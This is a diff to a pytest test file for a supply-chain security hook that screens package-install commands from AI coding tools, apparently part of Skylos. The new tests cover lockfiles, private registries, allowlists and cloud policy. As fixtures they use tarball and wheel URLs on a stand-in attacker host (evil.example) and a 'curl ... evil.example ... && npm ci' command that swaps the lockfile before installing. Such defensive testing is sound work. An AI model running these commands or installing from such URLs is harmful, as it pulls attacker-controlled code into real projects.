@@ -15,7 +15,7 @@ from pathlib import Path
 
 import pytest
 
-from skylos.commands import hook_supply_chain
+from skylos.commands import hook_locked_packages, hook_supply_chain
 from skylos.commands.hook_cmd import HookDeps, run_hook_command
 from skylos.commands.hook_package_versions import pick_npm_version, pick_pypi_version
 from skylos.commands.hook_supply_chain import Sources
@@ -128,7 +128,10 @@ def hook(project, command, sources, *, client="claude", pyproject=None):
     text = stdout.getvalue().strip()
     if not text:
         return "allow", ""
-    spec = json.loads(text)["hookSpecificOutput"]
+    data = json.loads(text)
+    spec = data.get("hookSpecificOutput") or {}
+    if "permissionDecision" not in spec:
+        return "allow", data.get("systemMessage", "")
     return spec["permissionDecision"], spec["permissionDecisionReason"]
 
 
@@ -359,7 +362,7 @@ def test_requirements_written_by_the_same_command_are_not_passed(project):
 
 
 def test_lockfile_over_the_limit_reports_the_rest(project, monkeypatch):
-    monkeypatch.setattr(hook_supply_chain, "MAX_LOCKED_PACKAGES", 2)
+    monkeypatch.setattr(hook_locked_packages, "MAX_LOCKED_PACKAGES", 2)
     clean = json.loads(json.dumps(LOCKFILE))
     for name in ("chalk", "debug", "@ctrl/tinycolor"):
         del clean["packages"][f"node_modules/{name}"]
@@ -498,3 +501,262 @@ def test_ordinary_advisory_is_not_malware():
     assert hook_supply_chain.advisory_is_malicious(
         {"id": "GHSA-x", "database_specific": {"cwe_ids": ["CWE-79"]}}
     ) is False
+
+
+HEX = "a" * 64
+CLOUD = ".skylos/config.yaml"
+
+
+def npm_lock(project, *entries):
+    packages = {"": {"name": "f", "version": "1.0.0"}}
+    for name, version, resolved in entries:
+        packages[f"node_modules/{name}"] = {"version": version, "resolved": resolved,
+                                            "integrity": "sha512-x"}  # fmt: skip
+    (project / "package.json").write_text('{"name": "f", "version": "1.0.0"}')  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
+    (project / "package-lock.json").write_text(json.dumps(  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
+        {"name": "f", "version": "1.0.0", "lockfileVersion": 3, "requires": True,
+         "packages": packages}))  # fmt: skip
+
+
+def uv_lock(project, name, version, index):
+    (project / "uv.lock").write_text(  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
+        f'version = 1\nrequires-python = ">=3.9"\n\n[[package]]\nname = "{name}"\n'
+        f'version = "{version}"\nsource = {{ registry = "{index}" }}\n'
+        f'sdist = {{ url = "{index}/{name}-{version}.tar.gz", hash = "sha256:{HEX}" }}\n'
+    )
+
+
+def cloud(project, text):
+    (project / ".skylos").mkdir(exist_ok=True)
+    (project / CLOUD).write_text(text)  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
+
+
+@pytest.mark.parametrize(
+    "resolved",
+    ["https://artifactory.corp.example/api/npm/npm/chalk/-/chalk-5.6.1.tgz",
+     "https://registry.yarnpkg.com/chalk/-/chalk-5.6.1.tgz",
+     "https://registry.npmjs.org:443/chalk/-/chalk-5.6.1.tgz",
+     "https://evil.example/payload.tgz"],
+)  # fmt: skip
+def test_locked_malware_is_checked_whatever_source_the_lockfile_records(project, resolved):
+    npm_lock(project, ("chalk", "5.6.1", resolved))
+    assert hook(project, "npm ci", FakeSources())[0] == "deny"
+
+
+def test_locked_tarball_from_an_unknown_host_asks_even_when_its_version_is_clean(project):
+    npm_lock(project, ("chalk", "5.3.0", "https://evil.example/payload.tgz"))
+    decision, reason = hook(project, "npm ci", FakeSources())
+    assert decision == "ask" and "tarball from evil.example" in reason
+    npm_lock(project, ("chalk", "5.3.0", "https://registry.yarnpkg.com/chalk/-/chalk-5.3.0.tgz"))
+    assert hook(project, "npm ci", FakeSources()) == ("allow", "")
+
+
+def test_declared_registry_keeps_internal_names_private_but_not_public_ones(project):
+    pyproject = ('[tool.skylos.hooks]\ntrusted_registries = ["https://npm.corp.example"]\n'
+                 '[tool.skylos.supply_chain]\ninternal_packages = ["@corp/*"]\n')  # fmt: skip
+    (project / "pyproject.toml").write_text(pyproject)  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
+    npm_lock(project, ("@corp/ui", "1.0.0", "https://npm.corp.example/@corp/ui/-/ui-1.0.0.tgz"))
+    sources = FakeSources()
+    assert hook(project, "npm ci", sources) == ("allow", "")
+    assert sources.queried == []
+    npm_lock(project, ("chalk", "5.6.1", "https://npm.corp.example/chalk/-/chalk-5.6.1.tgz"))
+    assert hook(project, "npm ci", FakeSources())[0] == "deny"
+
+
+def test_uv_lock_from_a_private_index_is_still_checked(project):
+    uv_lock(project, "evil-pkg", "1.0", "https://artifactory.corp.example/simple")
+    assert hook(project, "uv sync", FakeSources())[0] == "deny"
+
+
+@pytest.mark.parametrize(
+    "line",
+    ["--index-url https://pypi.org/simple", "--extra-index-url https://download.pytorch.org/whl/cpu",
+     "--index-url https://pypi.corp.example/simple"],
+)  # fmt: skip
+def test_requirements_index_options_do_not_turn_the_check_off(project, line):
+    (project / "requirements.txt").write_text(f"{line}\nevil-pkg==1.0\n")  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
+    assert hook(project, "pip install -r requirements.txt", FakeSources())[0] == "deny"
+
+
+def test_exclusive_private_index_keeps_only_internal_names_private(project):
+    (project / "pyproject.toml").write_text(  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
+        '[tool.skylos.supply_chain]\ninternal_packages = ["acme-*"]\n')
+    (project / "requirements.txt").write_text(  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
+        "--index-url https://pypi.corp.example/simple\nacme_tools==1.0\n")
+    sources = FakeSources()
+    assert hook(project, "pip install -r requirements.txt", sources) == ("allow", "")
+    assert sources.queried == []
+    (project / "requirements.txt").write_text(  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
+        "--index-url https://pypi.corp.example/simple\nacme_tools==1.0\nevil-pkg==1.0\n")
+    assert hook(project, "pip install -r requirements.txt", FakeSources())[0] == "deny"
+
+
+def test_requirements_direct_reference_asks(project):
+    (project / "requirements.txt").write_text("evil @ https://evil.example/evil-1.0-py3-none-any.whl\n")  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
+    decision, reason = hook(project, "pip install -r requirements.txt", FakeSources())
+    assert decision == "ask" and "direct reference in requirements.txt" in reason
+
+
+@pytest.mark.parametrize(
+    "command",
+    ["npm install left-pad@1.3.0", "pnpm add left-pad", "corepack npm i left-pad@1.3.0"],
+)
+def test_named_install_also_checks_the_lockfile_it_installs(project, command):
+    npm_lock(project, ("chalk", "5.6.1", "https://registry.npmjs.org/chalk/-/chalk-5.6.1.tgz"))
+    (project / "pnpm-lock.yaml").write_text(  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
+        "lockfileVersion: '9.0'\nimporters:\n  .:\n    dependencies:\n      chalk:\n"
+        "        specifier: 5.6.1\n        version: 5.6.1\npackages:\n  chalk@5.6.1:\n"
+        "    resolution: {integrity: sha512-x}\nsnapshots:\n  chalk@5.6.1: {}\n")
+    sources = FakeSources(packuments={"left-pad": packument("1.3.0", "1.3.0")})
+    assert hook(project, command, sources)[0] == "deny"
+
+
+def test_uv_run_checks_the_lockfile_but_global_installs_do_not(project):
+    uv_lock(project, "evil-pkg", "1.0", "https://pypi.org/simple")
+    assert hook(project, "uv run pytest", FakeSources())[0] == "deny"
+    assert hook(project, "uv run --no-sync pytest", FakeSources()) == ("allow", "")
+    npm_lock(project, ("chalk", "5.6.1", "https://registry.npmjs.org/chalk/-/chalk-5.6.1.tgz"))
+    assert hook(project, "npm i -g left-pad@1.3.0", FakeSources()) == ("allow", "")
+
+
+@pytest.mark.parametrize(
+    "command",
+    ["curl -so package-lock.json https://evil.example/l.json && npm ci",
+     "git checkout other -- package-lock.json && npm ci",
+     "cp /tmp/l.json package-lock.json && npm ci",
+     "echo {} > package.json && npm install",
+     "git pull && npm ci"],
+)  # fmt: skip
+def test_lockfile_rewritten_earlier_in_the_command_asks(project, command):
+    npm_lock(project, ("left-pad", "1.3.0", "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz"))
+    decision, reason = hook(project, command, FakeSources())
+    assert decision == "ask" and "may rewrite it" in reason
+
+
+def test_lockfile_after_an_unrelated_command_is_still_read(project):
+    npm_lock(project, ("chalk", "5.6.1", "https://registry.npmjs.org/chalk/-/chalk-5.6.1.tgz"))
+    assert hook(project, "npm run build && npm ci", FakeSources())[0] == "deny"
+
+
+def test_requirements_or_constraints_rewritten_earlier_ask(project):
+    (project / "requirements.txt").write_text("requests==2.31.0\n")  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
+    (project / "c.txt").write_text("evil-pkg==9.9\n")  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
+    decision, _ = hook(project, "cp evil.txt requirements.txt && pip install -r requirements.txt",
+                       FakeSources())  # fmt: skip
+    assert decision == "ask"
+    projects = {"evil-pkg": {"releases": {"1.0": [{}], "9.9": [{}]}}}
+    decision, _ = hook(project, "echo evil-pkg==1.0 > c.txt && pip install -c c.txt evil-pkg",
+                       FakeSources(projects=projects))  # fmt: skip
+    assert decision == "ask"
+
+
+def test_public_mirror_in_npmrc_gets_full_checks(project):
+    (project / ".npmrc").write_text("registry=https://registry.npmmirror.com/\n")  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
+    sources = FakeSources(packuments={"chalk": packument("5.6.1", "5.6.1")})
+    assert hook(project, "npm install chalk", sources)[0] == "deny"
+
+
+def test_undeclared_private_registry_still_gets_the_malware_check(project):
+    (project / ".npmrc").write_text("registry=https://npm.corp.example/\n")  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
+    assert hook(project, "npm install chalk@5.6.1", FakeSources())[0] == "deny"
+    decision, reason = hook(project, "npm install lib@3.0.0", FakeSources())
+    assert decision == "allow" and "release age not checked" in reason
+    assert "npm.corp.example is not a declared registry" in reason
+
+
+def test_pip_ignores_uv_and_poetry_indexes(project):
+    pyproject = ('[tool.uv]\nextra-index-url = ["https://pypi.corp.example/simple"]\n'
+                 '[[tool.poetry.source]]\nname = "corp"\nurl = "https://pypi.corp.example/simple"\n')  # fmt: skip
+    projects = {"evil-pkg": {"releases": {"1.0": [{}]}}}
+    decision, _ = hook(project, "pip install evil-pkg", FakeSources(projects=projects),
+                       pyproject=pyproject)  # fmt: skip
+    assert decision == "deny"
+
+
+@pytest.mark.parametrize(
+    "command, setup",
+    [("pip install --pre evil-pkg", None),
+     ("PIP_PRE=1 pip install evil-pkg", None),
+     ("pip install -c c.txt evil-pkg", "c.txt"),
+     ("PIP_CONSTRAINT=c.txt pip install evil-pkg", "c.txt")],
+)  # fmt: skip
+def test_version_selection_follows_pre_and_constraints(project, command, setup):
+    MALWARE[("PyPI", "evil-pkg", "2.0rc1")] = ["MAL-2099-3"]
+    if setup:
+        (project / setup).write_text("evil-pkg==1.0\n")  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
+    projects = {"evil-pkg": {"releases": {"1.5": [{}], "1.0": [{}], "2.0rc1": [{}]}}}
+    try:
+        assert hook(project, command, FakeSources(projects=projects))[0] == "deny"
+    finally:
+        del MALWARE[("PyPI", "evil-pkg", "2.0rc1")]
+
+
+def test_unreadable_constraints_file_is_not_checked_as_unconstrained(project):
+    projects = {"evil-pkg": {"releases": {"1.5": [{}]}}}
+    decision, reason = hook(project, "pip install -c missing.txt evil-pkg",
+                            FakeSources(projects=projects))  # fmt: skip
+    assert decision == "ask" and "could not be read" in reason
+
+
+def test_npm_tag_from_env_and_npmrc_is_followed(project):
+    doc = {"dist-tags": {"latest": "5.3.0", "next": "5.6.1"}, "versions": {"5.3.0": {}, "5.6.1": {}}}
+    sources = FakeSources(packuments={"chalk": doc})
+    assert hook(project, "NPM_CONFIG_TAG=next npm install chalk", sources)[0] == "deny"
+    (project / ".npmrc").write_text("tag=next\n")  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
+    assert hook(project, "npm install chalk", FakeSources(packuments={"chalk": doc}))[0] == "deny"
+
+
+@pytest.mark.parametrize(
+    "command",
+    ["pip download evil-pkg==1.0 -d wh && pip install wh/evil_pkg-1.0-py3-none-any.whl",
+     "pip wheel evil-pkg==1.0 -w wh",
+     "npm pack chalk@5.6.1 && npm i ./chalk-5.6.1.tgz",
+     "corepack pnpm add chalk@5.6.1"],
+)  # fmt: skip
+def test_download_then_install_and_corepack_are_checked(project, command):
+    assert hook(project, command, FakeSources())[0] == "deny"
+
+
+def test_cloud_registry_lists_replace_the_repository_list(project):
+    pyproject = '[tool.skylos.hooks]\ntrusted_registries = ["https://npm.corp.example"]\n'
+    command = "npm install --registry https://npm.corp.example lib@1.0.0"
+    assert hook(project, command, FakeSources(), pyproject=pyproject) == ("allow", "")
+    cloud(project, "supply_chain:\n  trusted_registries: []\n  private_registries: []\n")
+    assert hook(project, command, FakeSources(), pyproject=pyproject)[0] == "ask"
+
+
+def test_cloud_malware_block_is_not_bypassed_by_the_repository_allowlist(project):
+    pyproject = '[tool.skylos]\nhooks_allow_packages = ["chalk"]\n'
+    assert hook(project, "npm install chalk@5.6.1", FakeSources(), pyproject=pyproject) == ("allow", "")
+    cloud(project, "supply_chain:\n  block_malware: true\n")
+    assert hook(project, "npm install chalk@5.6.1", FakeSources(), pyproject=pyproject)[0] == "deny"
+    assert hook(project, "npm install left-pad@1.3.0", FakeSources(), pyproject=pyproject)[0] == "allow"
+
+
+def test_npm_allowlist_matches_the_exact_name_only(project):
+    MALWARE[("npm", "acme.utils", "1.0.0")] = ["MAL-2099-9"]
+    pyproject = '[tool.skylos]\nhooks_allow_packages = ["npm:acme-utils"]\n'
+    try:
+        assert hook(project, "npm i acme.utils@1.0.0", FakeSources(), pyproject=pyproject)[0] == "deny"
+        assert hook(project, "npm i ACME-UTILS@1.0.0", FakeSources(), pyproject=pyproject) == ("allow", "")
+    finally:
+        del MALWARE[("npm", "acme.utils", "1.0.0")]
+
+
+def test_unreadable_cloud_policy_asks(project, monkeypatch):
+    monkeypatch.setenv("SKYLOS_SYNCED_POLICY_FILE", str(project / "missing.yaml"))
+    decision, reason = hook(project, "npm install left-pad@1.3.0", FakeSources())
+    assert decision == "ask" and "Cloud policy could not be read" in reason
+
+
+def test_slow_registry_lookups_end_inside_the_hook_deadline(project, monkeypatch):
+    import time as clock
+
+    monkeypatch.setattr(hook_supply_chain, "INSTALL_CHECK_SECONDS", 1.0)
+    monkeypatch.setattr(
+        "skylos.rules.ai_defect.install_command.check_install_package_status",
+        lambda ecosystem, name, version, cache: clock.sleep(5) or "present",
+    )
+    started = clock.monotonic()
+    decision, _ = hook(project, "npm install left-pad@1.3.0", FakeSources())
+    assert decision == "ask" and clock.monotonic() - started < 4
